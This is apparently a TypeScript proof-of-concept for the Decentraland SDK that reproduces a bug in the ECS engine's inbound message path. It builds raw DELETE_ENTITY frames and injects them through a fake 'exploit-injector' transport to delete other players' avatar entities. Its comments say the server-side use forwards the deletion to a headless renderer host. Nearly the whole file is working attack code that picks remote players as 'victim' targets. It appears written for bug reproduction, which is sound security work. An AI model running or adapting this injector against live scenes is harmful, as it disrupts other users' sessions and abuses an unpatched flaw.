import { Entity, PlayerIdentityData, Transform, Transport, engine } from '@dcl/sdk/ecs'
import { isAvatarNumber } from './swaps'

// ---------------------------------------------------------------------------
// Shared exploit primitive: inject a crafted DELETE_ENTITY into THIS instance's
// scene engine via a throwaway transport, exercising the unguarded inbound path
// (`receiveMessages()` in @dcl/ecs). Used on both sides:
//
//  • client (repro-delete.ts) — purges the clicking client's own ECS view.
//  • server (server.ts) — purges the server's ECS AND, because receiveMessages
//    re-broadcasts the DELETE_ENTITY and rendererTransport.filter does not drop
//    it (no componentId), forwards it to the headless host via crdtSendToRenderer
//    — the one boundary where hammurabi's guard denies and bevy applies.
//
// Note `engine.removeEntity()` is NOT used: it is a deliberate no-op on the
// reserved/avatar range in this SDK (the #1544 allocator fix). Only the inbound
// receive path still purges, which is exactly the bug.
// ---------------------------------------------------------------------------

const CrdtMessageType_DELETE_ENTITY = 3
const CRDT_MESSAGE_HEADER_LENGTH = 8

// Minimal DELETE_ENTITY frame: [ uint32 length | uint32 type=3 | uint32 entity ]
export function deleteEntityFrame(entity: Entity): Uint8Array {
  const buf = new Uint8Array(CRDT_MESSAGE_HEADER_LENGTH + 4)
  const view = new DataView(buf.buffer)
  view.setUint32(0, CRDT_MESSAGE_HEADER_LENGTH + 4, true) // length
  view.setUint32(4, CrdtMessageType_DELETE_ENTITY, true) // type
  view.setUint32(8, entity as number, true) // packed entity id (version<<16 | number)
  return buf
}

// Avatar entities in this instance's ECS that are real remote players: hold both
// PlayerIdentityData and Transform, sit in the reserved range, are not our own
// PlayerEntity/Camera/Root, and (optionally) are not `exceptAddress`.
export function avatarTargets(exceptAddress?: string): Entity[] {
  const mine = new Set<Entity>([engine.PlayerEntity, engine.CameraEntity, engine.RootEntity])
  const except = exceptAddress?.toLowerCase()
  const out: Entity[] = []
  for (const [entity, identity] of engine.getEntitiesWith(PlayerIdentityData, Transform)) {
    if (mine.has(entity)) continue
    // Filter by NUMBER, not the packed id: a version-bumped avatar packs above 512
    // but is still a reserved player slot.
    if (!isAvatarNumber(entity as number)) continue
    if (except && identity.address.toLowerCase() === except) continue
    out.push(entity)
  }
  return out
}

export type AvatarPurger = {
  purge: (exceptAddress?: string) => Entity[]
}

// Install one injector transport on this instance's engine and return a purge()
// that injects a DELETE_ENTITY for every current avatar target.
export function createAvatarPurger(label: string): AvatarPurger {
  const injector: Transport = {
    send: async () => {},
    filter: () => false, // never re-broadcasts anything itself
    type: `exploit-injector-${label}`
  }
  engine.addTransport(injector)

  return {
    purge(exceptAddress?: string): Entity[] {
      const targets = avatarTargets(exceptAddress)
      for (const victim of targets) {
        injector.onmessage!(deleteEntityFrame(victim))
      }
      return targets
    }
  }
}
